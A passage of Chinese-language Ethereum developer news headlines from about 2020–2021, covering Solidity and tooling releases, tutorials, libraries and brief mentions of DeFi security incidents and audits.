v0.6\n\n\n如何在 OpenZepplin 中使用 accesscontrol.sol\n\n\n讨论合约架构的两篇文章，来自 Sheraz Arshad 和 Igor Yalovoy\n\n\n使用 0x API 汇集流动性\n\n\nCoinbase 价格信息输入机制：可使用 API 获得签过名的喂价信息了\n\n\n给 Compound 开发一个治理界面\n\n\nZerion SDK：复杂 ERC20 token 的链上解码器以及协议元数据的链上注册表\n\n\n使用 Embark 的 Subspace 库和 Infura 获得实时的前端数据\n\n\n使用 TrailofBit 的 Echidna fuzzer 来找出具有高 Gas 消耗量的交易\n\n\n上手 Brownie 三部曲：帮助 Python 工程师开发合约\n\n\n从 NPM 包获得回滚原因\n\n\nany.sender 交易中继者已上线主网\n\n\nOpenZeppelin 准备重新回到安全主业上来，因此不会再维护一些次要的代码库\n\n\nGas Station Network 已放到 opengsn.org 上\n\n\n为 ERC777 标准辩护\n\n\nLendf.me 追回了所有被攻击的资产\n\n\nHegic 期权合约被发现一个 bug，导致其一个函数永不能被调用。他们将为资产永久被锁的用户补偿损失（总计超过 150 ETH）\n\n\nbuidler v1.3：在 Buidler EVM 中测试基于时间的案例，可与 TheGraph 协同\n\n\nWaffle 计划推出 v3 来优化测试功能\n\n\n使用 Python 和 Brownie 来测试代码\n\n\nTypechain v2：Typescript 绑定。支持 Truffle v5、NatSpec\n\n\nSolidity docgen v0.5：为 Solidity 项目生成文档\n\n\n在 Remix 中运行 async/await scripts\n\n\nAustin Griffith 的 scaffold-eth：用于制作原型的工具箱\n\n\n可在 Solidity 中使用的一套 linked hashmap\n\n\n如何在 BigQuery 中添加代理以太坊地址\n\n\nAuthereum 的批处理交易 API 可用于利率套利\n\n\nStatus 发布的 discv5 可行性研究\n\n\n使用 Ganache、Jest 和 Uniswap 在主网分叉上做测试的教程\n\n\nEtheroll security issue：黑客检测工具，检测主网的分叉并使用此信息来抢跑交易。\n\n\nDragonfly 放出一个 oracles 跟踪器\n\n\nSynthetix CTO Justin Moses 论述他们为提高开发体验而使用的 10 种工具\n\n\nSolidity 0.6.x 的功能：数组切片\n\n\nTruffle v5.1.27：支持 Solidity 内联汇编的调试器\n\n\n可升级合约的钻石标准\n\n\n用于 Solidity AST 的 Typescript 类型\n\n\n用于 Defi 的 i18n 翻译字符串\n\n\n开发你的哈伯格税应用教程\n\n\nsecp256k1 twist attacks\n\n\n用 JavaScript 实现的 BLS12-381 配对友好型曲线\n\n\nTruffle v5.1.39：更多支持 Solidity v0.7\n\n\n如何让 Solidity 库拥有状态变量\n\n\nMaticVigil：一个帮助在 Matic 上开发的 API 网关\n\n\nGas saver deployer：使用 Chi gas token 来部署合约的合约\n\n\nSolidity 中的值数组\n\n\n如何最优化合约规模\n\n\n使用 Chainlink 来连接 API 和合约\n\n\n给工程师的零知识证明教学\n\n\nOpyn 给上周的 bug 出的事后报告\n\n\nERC20 tokens 安全交互入门指南\n\n\n一份 ERC721 subgraph\n\n\n自己实现以太坊的默克尔帕特里夏树来理解它\n\n\n使用 Echida fuzzer 测试你的 Solidity 代码\n\n\nSam Sun 发现了 xSNXa 的一个 bug\n\n\nOpenZeppelin 为 Buidler 和 Truffle 推出了插件升级\n\n\nGolem 为开发者推出 wasm 和 VM payloads 测试版\n\n\nSolidity v0.7.1：函数可在文件层面定义，可复制 calldata 结构体到存储（storage）\n\n\nChainsafe 的新路线图：web3JS 的 TypeScript，现正放出 v1.3 预选版\n\n\nCompoundJS\n\n\nTruffle v5.1.43，更好支持 Solidity v0.7\n\n\nrDai 的利息跟踪代码库\n\n\n在 Chainlink 中使用外部适配器\n\n\nTrail of Bits 所建议的开发 Eth 源代码的流程\n\n\n在 Solidity 中使用值数组完成 unique sorting\n\n\n在 Solidity 中实现 BLS 签名\n\n\nUnderhanded Solidity 竞赛正在进行！截止日期为 10 月 31 日\n\n\nweb3js v1.3：内置 typescript，websockets 已升级\n\n\nTruffle v5.1.45：hdwallet-provider 升级\n\n\ncreate-eth-app v1.5：带有 web3modal，所以你可以容易使用 MetaMask 或者 WalletConnect\n\n\nethers-rs 加入 Ledger 支持\n\n\nEEA 正在开展一个开发者工具调查，以发现企业用开发者工具可以提升的领域\n\n\n新入门的 ETH 开发者 Q&amp;A 视频，有很多关于开发工具的内容\n\n\n认识 Solidity 团队\n\n\ndiamond storage 的工作原理\n\n\n如何用 permit 实现 gasless 交易\n\n\nEarly 正在开发 Fe，一种用 Rust 写成的 python 风格的 EVM 语言\n\n\nbZx 被攻击；项目方使用 admin key 删除了攻击者的收获\n\n\nDeFi 产品的分叉抵抗策略\n\n\nNomic Labs 放弃了以太坊生态中常见的 node-gyp 依赖，代之以纯粹的 JS 密码学元件\n\n\n使用 solc-sjw 来随时在 Etherscan 上验证你的合约\n\n\nTruffle v5.1.49，兼容 Node 14，加入了新的包 abi-utils\n\n\nvyper v0.2.7：修复了安全问题\n\n\n更多关于新兴语言 Fe 的信息：这是一种用 Rust 语言写成、目标是 Yul 语言的 python 风格的语言\n\n\nEthworks 论安全流程：测试驱动型 Buidler 和 Waffle 配对型开发\n\n\nKendrick Tan 对入门开发者工具的观点 , 译文\n\n\n为什么 OpenZeppelin 要使用可升级插件？为了让开发者在生产环境中升级变得更容易\n\n\nGas 耗用量更低的可升级代理合约，不使用 storage\n\n\nAndre Cronje 的流动性委托治理模板\n\n\nCertora：Solidity 中的一个损坏 storage 的 bug\n\n\n在 Unity 中升级合约数据\n\n\n使用 ethersjs 自动提高 Gas Price 并重发交易\n\n\nerc20 permit 指南\n\n\nTheGraph 开发教程\n\n\nBildler 现升级为 Hardhat；更易于复制主网合约、更好支持生产环境中的多 sloc 版本\n\n\nTenderly 深度集成 Hardhat，还附带了指南\n\n\nTruffle v5.1.50 现在支持 web3js v1.2.9\n\n\nChainlink VRF 现在开始在主网上提供随机性了\n\n\nPrestwich 的 memview-sol：用 Solidity 中的运行时类型检查（typechecking）来访问 memory\n\n\n以太坊开发者中流传的误解\n\n\n使用 Mythril 发现所有权接管漏洞\n\n\nTrail of Bits 尝试使用在他们的审计报告中使用 n-grams in SlithIR 和机器学习；准备资料真难！\n\n\n拯救 DeFi cover 中的 20 亿美金的故事\n\n\nArgent 如何升级到 Solidity v0.6\n\n\n3box 的 IDX：一个用于去中心化身份（DIDs）的 SDK\n\n\n一个 Gas 效率更高的 WETH 版本\n\n\n自动连接你的 Unity 游戏到 MetaMask\n\n\n律师如何学习 Solidity？\n\n\nAustin Griffith 的 eth.build 教程，面向刚接触以太坊的互联网开发者\n\n\nOpenZeppelin 的 Defender：合约管理权限、交易中继者、自动调用合约的服务，以及安全最佳实践指南。Andre Cronje 表示他也是这个套件的粉丝\n\n\nSolidity\n。默认检查算术运算\n\nsolidity 团队 AMA\n\n\n\n执行链上多步骤工作流的轻量框架\n\n\nreact hook Hardhat 插件（即原来的 Buidler）\n\n\n通过 Rosco 的插件在 Truffle 内实现多文件验证\n\n\nweb3J open API：从你的 Solidity 代码生成 API\n\n\n使用 chainlink 预言机用 Solidity 实现看涨期权\n\n\n新的 ethereum.org 开发者门户：帮助以太坊开发者更容易地学习\n\n\ntypechain v4\n\n\nTenderly 加入代理支持\n\n\nSolt：从命令行（正式的 solc-sjw）验证合约，任何 框架/结构 都可\n\n\n在 Zepplin 的 Defender 平台上运行 Keep3r Network 的 keeper\n\n\nChainlink 教程：在一个 NFT 中获得随机数\n\n\nBitQuery 对比自身与 TheGraph\n\n\n通过阅读 GasToken 代码来理解 EVM\n\n\nEthereumNodes：公开的 PRC 端点的仪表盘\n\n\nMiao： Kendrick Tan 的 EVM 交易解码器，不需要额外的数据处理\n\n\n用户 TheGraph 的工具箱，带有 subgraph 映射通用的函数\n\n\n用于 Solidity 和 Vyper 的 Railroad 模式\n\n\nOpenZeppelin 可升级合约\n\n\n使用 Chainlink 测试 Eth 代码\n\n\n通过 GraphQL 断点来预测执行\n\n\n使用 redwoodjs 来创建一个以太坊应用\n\n\n搭配 Chainlink 的 VRF 教程用 Solidity 实现一个随机数生成器\n\n\nSolidity Underhanded 竞赛优胜者\n\n\n使用 chaind 分析信标链验证者的见证比率\n\n\n4byte.directory 现在有事件签名了\n\n\n最新的开发者入坑会议的视频\n\n\nInfura 收购了 anysender 并使用 Infura transaction 名义重新发布了产品（自动提高 gasprice 的中继者）（现在仅有测试网版本）\n\n\n“去中心化的 Github” Radicle 首次公开放出\n\n\n使用多种信息输入机制的 package（未经审计）\n\n\nRicMoo 的 ethersJS 更新：EIP712，React 原生测试工具\n\n\nweb3api wasm 标准，用于把 eth 集成到应用内\n\n\nweb3j 现在有了 solidity 依赖管理器\n\n\n在 Eth 和 Matic 上创建 NFT 的 Unity 插件\n\n\nSolidity v0.8，和 SafeMath 说再见，内部错误（internal errors）会导致 revert 而不是 invalid\n\n\nSolidity 0.7.6，更好地支持 calldata 的数据类型，fallback 函数可以返回 data\n\n\nethersjs 使用起来已等同于 web3js\n\n\nMyCrypto 的 测试网水龙头 —— 支持 Kovan、Rinkeby、Ropsten、Goerli 四个测试网\n\n\nTheGraph 上线主网，支持去中心化的索引，subgraphs 将在 2021 年开始迁移\n\n\n\n以太坊开发者最头疼的 5 个问题，以及 web3api 如何提升体验\n\n\n使用 chainlink 开发并销售你自己的 动态 NFT\n\n\n使用 DefiPulse API 获得 DeFi 数据\n\n\nEthGlobal 的 2020 开发者调查\n\n\nUSDC v2：升级价值几十亿美元的合约\n\n\nPaul Berg 的 Multisol 工具，让验证更简单\n\n\nEth 应用的前端开发工具 Boilerplate：只需提供 ABI JSON 文件\n\n\nWalletConnect v1.3.2：客户端包大小减半，iOS 链接可分页\n\n\nStarkWare 放出 Cairo 工具包，可制作通用计算的证明：编译器、VM、跟踪器/调试器、IDE\n\n\nsolidity-bytes-utils v0.1.2：修正了 slice 方法中的内存污染错误（tainted memory bug）\n\n\nNick Addison 的事务可视化工具 tx2uml\n\n\nSolidity 插件 Prettier 现已支持 Solidity v0.8\n\n\nSolidity 中 使用 tree-sitter 的增量解析器\n\n\n一个使用 ERC1167 最小化代理合约的便宜 erc20 token 生成器\n\n\n给门外汉的 Solidity 教程视频。Austin Griffith 参与录制。从设置环境开始\n\n\n使用 scaffold-eth 复制以太坊主网、与 Uniswap 交互，学习基本知识\n\n\n如何在 Etherscan 上验证你的 Brownie 项目\n\n\n通过 Bitquery API 获得 eth2 数据\n\n\nSword：专为变成金融衍生品合约而设计的语言\n\n\nStarkWare 的在线 IDE：Cairo Playground。还包含多个教程\n\n\nMetamask provider 推出了重大变更\n\n\nethers-rs v2\n\n\nRestless：express.js 框架的简单验证库\n\n\n使用 Smock 来模拟 Hardhat 中的合约\n\n\n使用 Hardhat 部署治理合约的教程\n\n\nweb3js v1.3.3：解决 Metamask 的服务提供者问题\n\n\nFe（类 python 语言） v0.1 alpha 版本发布\n\n\nTruffle-token-test-utils 工具包中的 token 转移可视化工具\n\n\nSMTChecker 以及外部函数合成：Solidity 下一版中即将加入的功能\n\n\n给开发者的以太坊指南，part-2\n\n\nSolidity v0.8.1：SMTChecker 支持外部调用\n\n\nSolidity 开发者问卷调查结果。Solidity Discourse 聊天室已启动\n\n\nPWC：你也许会错过的 Solidity v0.8.x 的重点\n\n\nParadigm CTF 将于 2 月 5 号驱动\n\n\nOpenZeppelin 的 Hardhat/Truffle 升级插件现已支持结构体和枚举\n\n\nAustin Griffith 的 eth 脚手架挑战/教程：开发 staking 应用\n\n\n使用 Infura 开发闪电贷套利机器人\n\n\nhevm v0.44：接受通过 --standard-json 打造的 solidity json 输出\n\n\n配对友好型椭圆曲线代码库的基准测试\n\n\nAustin Griffith：闪电贷入门\n\n\nsolc-select v0.2：简单切换 Solidity 的不同版本\n\n\nRemix IDE v0.10.10\n\n\n介绍 Solidity 的模糊测试方法\n\n\n使用 Sourcify 自动化验证你的代码\n\n\n使用 Tarantula 发现你代码中的单元测试错误\n\n\nInfura TX 上线主网\n\n\n利用 Hardhat 插件获得 ABI\n\n\n使用 Arduino 设备打造一个支持密码货币支付的自动售货机\n\n\n使用 Tenderly 的 Defi Simulation：即时生成 fork 并控制区块高度/状态，以模拟交易\n\n\n如何使用 ethersjs 流水式处理待打包交易\n\n\nPrysmatic：发现一个奇怪的 bug，启动时无法执行数据库调用\n\n\nInfura：为什么 Infura Transactions 比你自己搭建的家用 relayer 更好\n\n\nEtherscan 实现了一个合约对比器\n\n\nStarkware 在 Cairo 教程中的投票 app 可以改造成签名聚合器\n\n\n以太坊应用开发者应对不兼容的协议变更有所预期\n\n\nSolidity v0.8.2：内联、定制化的 NatSpec、导出文献\n\n\n使用简单的内联节约 gas\n\n\nHardhat v2.1：一个完全模拟 geth 的事务池实现\n\n\nZero configuration for Hardhat and Typechain\n\n\n详细解读 ERC3156 闪电贷标准\n\n\nWETH10 上线主网\n\n\nOpenZeppelin Sentinel：用于监控和报警\n\n\n重新实现 Nxcus Mutual 的联合曲线，以防止高 MCR 漏洞\n\n\nScaffold-eth + optimism 以太坊开发者新手包\n\n\nHarmony：开源的交易池浏览器\n\n\nApe Safe：从本地的主网分叉预览 GnosisSafe 交易\n\n\nwighawag 升级了 boilerplate 以支持 Solidity 合约部署\n\n\nGolem 归来，在 zkSync 上运行新版主网\n\n\nLinda Xie：DAO 入门指南\n\n\nLucius Fang：深入研究去中心化保险\n\n\nKeep 和 NuCypher 正讨论链上协议合并\n\n\n使用 EVM384 实现 MiMC 哈希函数，Gas 开销比 circom 更低，可能需要一个初始化机制来处理 Montgomery multiplication quirks\n\n\n可扩展的状态网络广播机制\n\n\nLakshman 长推特解释状态规模管理以及为何要使用 verkle tree 以及状态保质期机制\n\n\nWalletConnect v1.4：手机连接的动态注册\n\n\n复制 MakerDAO 的 multicall，为你的 dApp 快速生成 RPC 批请求，一行代码即可集成\n\n\n使用 ReverseRecord 集成 ENS，一次函数调用即可返回多个 ENS 域名\n\n\n教程：使用 StarkWare 的 Cairo 语言打造一个 AMM\n\n\n用 OpenZeppelin 和 Quiknode 创建和部署一个 NFT 的指南\n\n\nFlashbots 现已有 12% 的算力接入\n\n\n一套 MEV 分析框架：量化已实现的价值抽取\n\n\n反夹三明治攻击者：狡猾的 ERC20 合约从三明治攻击者手中捕获了 130 ETH；其实就是以其人之道还治其人之身\n\n\nSolidity v0.8.3：修复了优化器缓存中的 keccak bug\n\n\nOpenZeppelin Contracts v0.4：现在开始 SafeMath 只是一个封装器，存储项优化，GSN v2\n\n\nmix v0.11 系列加入了 Workspaces\n\n\n最新的 dapptools (hevm, seth, dapp) 放出：加入 EIP712 签名，更好的模糊测试和符号化执行\n\n\n5 kB 的全功能微型 Eth 签名器（外加 26kB 的依赖）\n\n\n5 分钟内让你的应用兼容 GnosisSafe\n\n\n来自 EthWoks 的 Usedapp 框架，用到了 ethers、web3-react、MakerDAO 的 multicall 和 Waffle\n\n\n使用 Vue 和 NodeJS 写出简洁的 dapp\n\n\n用 Cairo 写出一个寻找质数的程序\n\n\nHardhat 部署教程\n\n\n整个 NFT 闪电贷\n\n\nFe 语言开发者更新 4（包括 uniswap v2 demo）\n\n\nSolidity v0.8.3：修复了优化器缓存中的 keccak bug\n\n\nOpenZeppelin Contracts v0.4：现在开始 SafeMath 只是一个封装器，存储项优化，GSN v2\n\n\nmix v0.11 系列加入了 Workspaces\n\n\n最新的 dapptools (hevm, seth, dapp) 放出：加入 EIP712 签名，更好的模糊测试和符号化执行\n\n\n5 kB 的全功能微型 Eth 签名器（外加 26kB 的依赖）\n\n\n5 分钟内让你的应用兼容 GnosisSafe\n\n\n来自 EthWoks 的 Usedapp 框架，用到了 ethers、web3-react、MakerDAO 的 multicall 和 Waffle\n\n\n使用 Vue 和 NodeJS 写出简洁的 dapp\n\n\n用 Cairo 写出一个寻找质数的程序\n\n\nHardhat 部署教程\n\n\n整个 NFT 闪电贷\n\n\nFe 语言开发者更新 4（包括 uniswap v2 demo）\n\n\nCompound 的新治理代码已经提出，更和谐，也更多功能\n\n\nSlither v0.7.1，solv 版本建议升级到 0.7.6\n\n\n使用 Tenderly 预备好在柏林硬分叉后的智能合约。现已包含访问列表工具\n\n\nSolar：交互式分析工具\n\n\n让 Flashbots 运行在浏览器内\n\n\n4byte npm：使用 4 字节的哈希值查找一个以太坊函数的签名\n\n\ndharmaOS：一个 SDK，可以将任意 EVM 协议动作连接到 Dharma 的支付轨道内（当前仅限于美国\n\n\n理解柏林分叉之后的 Gas 开销：访问列表有望降低 Gas 开销，但其主要目的在于让 2929 的激活不会破坏当前的合约\n\n\nOpenZeppelin Wizard：告诉它你要什么功能，然后它就会生成 Solidity 给你\n\n\n使用 Usedapp 来测试和使用定制化的 hooks\n\n\nEth 全栈开发者完全指南\n\n\nHardhat v2.2，已适配 “柏林” 升级\n\n\n在 Remix 中迁移文件到 workspaces\n\n\nVSCode 已经可以使用 Remix 了\n\n\nBlocknative 的模拟平台：通过 API 函数调用和净余额的改变来发现交易池中有什么东西\n\n\nEVM 操作码列表已经为 “柏林” 分叉更新\n\n\n如何在私钥泄漏后打败清扫机器人并恢复你的资产？\n\n\nSolidity v0.8.4：custom errors 以及修复了 ABI 解码器 v2 的 bug\n\n\nPRBMath：来自 Paul Berg 的固定点数据 Solidity 库\n\n\n一个用于 Hardhat 的 Ethernal 插件：本地网络的简易区块浏览器\n\n\nTorus 推出 Face/TouchID 登录\n\n\nzoKrates v0.7：以太坊库种的 SNARKs，带有 constant generics 的重大发布\n\n\n一个用 Solidity 实现的 VDF 原型\n\n\nRivet 的 Bolt：没有请求上限地查询以太坊的事务数据\n\n\n同时学习 SQL 和 ETH 的教程\n\n\n使用 archivenode.io 和 IPFS 的 Debug 命令行\n\n\nOpenZeppelin Contracts v4.1：更便宜的 UUPS 代理合约，闪电铸币功能, 多调用批交易，还有 EIP2098 以及签名检查器\n\n\nOCaml-Solidity：Solidity 解析器和类型检查器库\n\n\nHardhat 的 Circom 和 SnarkJS snark 插件\n\n\nZoKrates v0.7.1：不变量声明、不变量范围检查，现在又加入了波塞冬哈希函数（poseidon hash function）\n\n\n最新的 web3.py v5.19：可调用状态覆盖\n\n\nENS 集成最佳实践\n\n\nRemix IDE v0.11.5：加入了 Solidity 的 “定制报错” 功能\n\n\n你的节点能够用 eth_estimateGas 给你准确的 gas price 信息吗？\n\n\nEric Wall 认为 Chainlink v2 不如 v1 安全\n\n\nTypechain v5（给 Eth 代码做得额 TypeScript 捆绑）\n\n\nETK：EVM 字节码封装和解封器\n\n\n使用主网状态模拟交易的工具\n\n\nSolidity 优化器的完整文档：旧版使用操作码，新版使用 Yul 语言\n\n\n在 OpenZeppelin 上使用新的可升级 UUPS（EIP1822）代理合约的教程\n\n\n在以太坊上开发 graphQL API\n\n\n新的事务类型（理解 EIP2718）\n\n\ntally：用于 JavaScript 和 EVM 的任意精度数学库\n\n\nPinata 现在可提供指定的 IPFS 网关\n\n\n用于 Eth 应用的 JavaScript 安全最优做法\n\n\nDabit and Austin Griffith 视频讲解 web2 开发者如何上手开发 web3 应用\n\n\nweb3.js v1.3.6 安全补丁\n\n\nUMA 的 Optimistic 信息播报机制，通过争议裁决流程实现；已是正式产品，且不需要使用 UMA 的金融合约\n\n\nGnosis Safe L2/侧链 推广计划 ，因此你可以在 L2/侧链 上保护 DAO 的财库和智能合约函数特权（比如升级功能）\n\n\nAlchemy Transfer API：单次调用即可访问历史 ETH、ERC20 和 ERC721 转账数据\n\n\n钱包可组合性：分析合约服务的组件\n\n\nEthers v5.2.0：报错信息定制、探测替换交易\n\n\nStarlight：EY 开发的、使用 Solidity 开发 ZK app 的编译器原型\n\n\n节点和浏览器最常用的 secp256k1 （椭圆曲线密码学）库已经很少得到维护。可考虑换用一个更著名的\n\n\n运行 ABI 编码数据的 EVM 工具\n\n\nGSN v2：去中心化的元交易中继者启动，更好的中继路由器和保护措施：允许用户使用任意 token 来支付\n\n\n钱包开发者请加入 “伦敦” 基础设施可读性会议，讨论包括要把什么命名暴露给用户在内的议题\n\n\n使用 Splunk 来分析 Geth 指标、日志和账本数据\n\n\nAustin Griffith scaffold-eth 给 web2 开发者的入门教程\n\n\nfreeCodeCamp 作的 web3 介绍\n\n\n更新到 ethers v5.3.0+ 以防范对早期 ws 版本的 DoS 攻击\n\n\nJS-Waku：在浏览器里使用 Waku v2 的代码库。dApp 可以收发 p2p 消息，查询错过的消息并发送确认\n\n\nNFT.Storage：通过 IPFS 和 Filecoin 实现的免费去中心化存储和带宽\n\n\n使用 Flashbots 来原子化地许可和转移 ERC 20 代币\n\n\n读取和写入某个存储档的 Solidity 库\n\n\nGeth 的交易签名器，用于使用 AWS 密钥管理服务所用的私钥\n\n\nCircom 和 snarkJS 代码库现已支持 PLONK\n\n\nOpen Source Insights：开源依赖的交互式检查\n\n\n来自 OpenZeppelin 的 Tincho：让审计员对你好感大增\n\n\nVitalik：适合区块提议者和构建者分离的手续费市场设计\n\n\nMEV-SGX：使用安全飞地来提供一个隐私的交易池以及暗标 MEV 拍\n\n\nSolidity v0.8.5：从 bytes 到 bytesNN 的转换，还有 verbatim 内置函数，可注入 Yul 语言的任意字节码，用于支持新的字节码和项目（比如 Optimism）\n\n\nbytes.concat(bytes(s1), bytes(s2))：从 Solidity v0.8.4 开始连接字符串的办法\n\n\nFe 发布新网站：下载代码库、阅读文档和案例\n\n\nRemix v0.12.0：Hardhat 插件，可在浏览器内使用 Git、易于创建 GIST，定制化报错\n\n\nVS Code Solidity 插件 v0.12\n\n\nInstadapp Terminal：使用 SDK 和 web3 的浏览器交互\n\n\nBondzier：实验性的 bezier bonding curves，用于 ECR1155 代币\n\n\nSolidity v0.8.6：修复了不可到达的代码警告和优化器设定\n\n\nRemix IDE v0.13.0：JavaScript VM 的 “伦敦” 升级版本\n\n\nCoinbase Solidify：使用签名数据库检测合约特性，打出风险得分并建议环节措施\n\n\nGov Alpha 部署器的前端：一笔交易创建一个 token、治理器和时间锁\n\n\n使用 Remix 和 Hardhat 的定制化报错功能教程\n\n\nEcrecover 教程\n\n\nOpyn 的 开发者工具箱，用于在 Opyn 开发期权项目\n\n\nOpenZeppelin 合约套件 v4.2：ERC20 的投票插件（用于治理），ERC20 的封装器、以及 ERC 1155 的跟踪所有流通 token id 的插件\n\n\n理解 Compound 的 治理器合约 Bravo\n\n\nEthers v5.4.0：支持 EIP1559，TransactionResponse.gasPrice 可设为空值\n\n\nWeb3.js v1.4.0：支持 “柏林” 升级，在签名时默认适配 “柏林” 升级\n\n\ndapptools v0.33.0：不变量的测试，以及一个 FFI cheatcode\n\n\nWeb3.py London branch：支持发送 EIP1559 交易\n\n\nCairo playground 已支持直接在 StarkNet 上部署合约\n\n\nHardhat 的每周下载量首次超过 Truffle\n\n\nHardhat 接口生成器：可以从一个 Solidity 中生成一个接口\n\n\nEthereumJS 新版本，完全支持 “伦敦” 升级\n\n\nAndre Cronj 一口气发布了 5 个项目原型供学习和启发周边的团队\n\n\n使用 Hardhat 操纵 Local 的 ERC20 余额（帮助测试）\n\n\n“伦敦” 升级后的 EVM 操作码参考\n\n\nEthernautDAO 致力于让资深开发者成为以太坊开发者\n\n\n使用 Next.js、Tailwind、Hardhat 和 Ethers.js 在以太坊测试网上开发一个 NFT 市场\n\n\nx * y = k AMM 代码逐行解释\n\n\nRemix IDE v0.14.0：在调试器中显示下一个操作码，可多选文件删除\n\n\nMetaMask JSON-RPC API，用户调试\n\n\n为 EIP1559 作准备：移除 gasPrice 字段，加入 maxPriorityFeePerGas 和 maxFeePerGas 字段\n\n\n使用 eth_feeHistory API 来估计 EIP1559 的手续费\n\n\nBrownie：基于 OpenZeppelin 透明代理机制，实现可升级的智能合约\n\n\nFe 语言编译器支持 JavaScript\n\n\nOpenZeppelin subgraphs 库：为常用的 OpenZepplin 合约建立 subgraphs\n\n\nOtterscan v2021.07.03：检查 Erigon 连接，集成 Chainlink，专注于推荐和更小的二进制分发\n\n\n使用 React 实现 MetaMask 的 Web 3 登录\n\n\nRarepress：2 行 JavaSceipt 就可以在 Rarible 上铸造 NFT，而且元数据放在 IPFS 上\n\n\nHardhat v2.5.0：Hardhat 网络升级\n\n\nBrownie v1.15.0：Multicall 语境管理器，Solidity 0.8 类型错误，EIP712 消息签名，硬件钱包支持，Vyper v0.2.14\n\n\nPermit Singleton：用于已部署 EIP20/721/1155 token 的元交易转账\n\n\nmicro-eth-signer 升级（以支持 “伦敦” 和 “柏林” 分叉）\n\n\nabi-to-sol v0.3.0：加入了一个网页 UI，提升了对旧版本 Solidity 的支持\n\n\nLedger 插件：可解析交易的字段以及为智能合约开发定制化的显示\n\n\n不要在信息输入机制中使用现货价格\n\n\n初学者教程：使用 useDapp 在 React 中发送交易\n\n\nEthers.js playground\n\n\nRemix IDE v0.15.0：整合 Slither，为共享文件生成 URI，以及在 Remix 内使用 Gists\n\n\nweb3.js v1.5.0：支持 EIP-1559、更新文档\n\n\nNethereum （.Net 库）v4.0.0：支持 EIP-1559\n\n\nFe v0.7.0-alpha：运行时检测，定制化的回滚报错，字节类型移除以及多行字符串支持\n\n\nMyCrypto 的 TypeScript 策略用于估计 EIP-1559 下的手续费\n\n\nEthTx：交易的解码器网站，开源的 Python 库\n\n\nSmart-contract-inspector：状态变量可视化库和 demo 网站\n\n\n安全地使用 delegatecall\n\n\n用字节码解释合约的创建\n\n\n从发现 Optimism 的 L1-L2 存款 bug 中获得工程经验\n\n\nAustin Griffith：以太坊开发者新手快速入门\n\n\nweb3js v1.5.1\n\n\nweb3J 为 Java 开发者加入 1559 支持\n\n\nNethereum v4.0.2 支持 ETH_FeeHistory RPC 方法\n\n\n请尽快切换到 WalletConnect v1.5.2\n\n\nUseDapp：浏览器插件，在 web3 前端给你的开发者工具做书签\n\n\nHardhat packager 插件，用于注册器开发\n\n\n手把手教你用 Hardhat 复制主网的状态\n\n\nReorgme：为私有链创造 reorg\n\n\nsol2uml 现在支持文件级别的结构体和 Solidity 在 0.6.x 版本引入的枚举\n\n\nabi-to-sol v0.5 支持在 输入 ABI 和对应的输出中定制化报错信息\n\n\n使用 Eth 账户做登录系统，开发者快速上手指南\n\n\n在 TheGraph 上构筑一个汇编脚本链\n\n\nweb3.js v1.5.2：移除默认交易类型，改称 Type 0\nRemix IDE v0.16.2：支持 Metamask v10.0.0+ 和 type 2 交易类型（即 1559 格式的交易）\n使用 OpenZeppelin 在 Etherscan 上验证合约的指南\nHardhat 比较 Hardhat Network 和其它配置网络的不同之处\nethers-flashbots （Rust）：以 Flashbots bundle 的形式发送交易\nposeidon-tornado：使用 Poseidon Hash 的 Tornado Cash 复制品\nLambda School 正在开发能够覆盖传统开发者和密码货币行业开发者的区块链课程\n\n\nFe （EVM 语言）计划在 2021 年推出生产版本\n\n\nRemix IDE v0.17.0：Solidity 默认版本 0.8.7，EVM 默认为伦敦后版本，在 Remix Terminal 显示 Hardhat 控制台日志\n\n\nEtherscan 添加 ERC1155 多代币标准支持\n\n\n使用 SMTChecker 检查 Solidity 合约不变量的教程\n\n\nTenderly 现已支持 Vyper 语言\n\n\nts-essentials v8.1.0 （TypeScript）：修复一些小问题\n\n\nfractional-rs（Rust）：fractional.art 的命令行工具和函数，只支持拍卖\n\n\n在多网络 app 中添加 ENS 支持的指南\n\n\nzk-ml：隐私的机器学习 demo。\n\n\nGitPOAP：代码库的维护者可以给贡献者奖励 POAP\n\n\n使用 scaffold-eth 创建一个 staking dapp 的教程\n\n\ndapptools v0.34.1：使用 标签/分支来测试覆盖、安装合约库\n\n\nseth v0.11.0：支持 EIP-1559 和 ENS 辅助\n\n\ndapptools-template：dapptools 的快速启动模板\n\n\nRicmoo 的 ethers.js 更新：支持 EIP-1559 和 ethers 工作区\n\n\nweb3.js 用户问卷调查\n\n\nsolidity-shell：交互式的 Solidity shell 和轻量的 session 记录\n\n\nfreeCodeCamp 的 Solidity 开发入门课程（13 节视频课，使用 Python 和 Brownie）\n\n\nGanache v7.0.0 alpha.1：本地区块链（前身是 ganache-cli）适配伦敦升级\n\n\nweb3.js v1.5.3：修复了在支持伦敦升级的网络上发送传统类型交易的问题\n\n\neth-hooks （TypeScript）：常用的狗子，比如余额、供应商、合约加载器和 ENS 解析器，来自 scaffold-eth\n\n\ngas-estimation：来自 MyCrypto 的 EIP1559 库，从一个以太坊节点取至少 10 个区块的数据\n\n\n使用 OpenZeppelin &amp; Hardhat 创建 ERC20 支付分割器的指南\n\n\nFull Knowledge User Proofs：使用 call data 和用户证明而不是读取状态的设计模式\n\n\n使用 Ethereum 的登录流程\n\n\nSolidity v0.8.8 以及 v0.8.9（修复 bug）：用户自定义的数值类型（在 v0.8.9 中修复），接口函数可选覆盖关键字，在构造器中读取不变量，enums 的最夏至和最大值，修复签名不变量的 bug\n\n\nVS Code Solidity v0.0.129：在工作区和重映射中支持多个文件夹\n\n\n使用 Solidiy 定制化的 nastpec 标签在元数据 json 中加入结构化的信息并哈希到字节码中\n\n\nEthereumJS 新版本：devp2p（RLPx v5）的快照压缩、支持定制化的链状态、修复 Blake 预编译中的共识 bug\n\n\nweb3.js v1.6.0：移除旧依赖，以便迁移到 LTS v1.x\n\n\nethers-rs v0.5.3 (Rust)：配置优化器以及 pass 声明，支持十进制，修复了 wei 的计算\n\n\nCREATE3：部署合约的库，地址是确定性的，依赖于 salt 而非代码，减少了 6 万的 gas 消耗量\n\n\nSSTORE2 合约存储方式，在大于 64 字节的项上，比原生的方法要更便宜；对 SLOAD 最多可便宜 17 倍，对 SSTORE 最多可便宜 3 倍\n\n\nERC3652PureProxy：基于纯粹代理工厂的 CREATE2，在构造器中执行 delegate call\n\n\nFisher-Yates Shuffle：链上随机打乱数据\n\n\nnoble-hashes：SHA2、SHA3、RIPEMD、BLAKE2、HMAC、HKDF、PBKDF2 和 Scrypt 的快速、安全、最小化的 Javascript 实现\n\n\nprb-math.js：PRBMath Solidity 库的 JavaScript 